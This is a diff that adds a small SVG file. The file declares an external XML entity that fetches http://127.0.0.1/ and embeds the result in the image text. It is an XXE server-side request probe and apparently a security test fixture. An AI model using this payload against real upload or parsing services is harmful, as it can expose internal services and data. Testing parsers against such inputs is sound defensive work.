@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [<!ENTITY probe SYSTEM "http://127.0.0.1/">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="640" height="100">
+  <text x="10" y="35">LOOPBACK:[&probe;]</text>
+</svg>
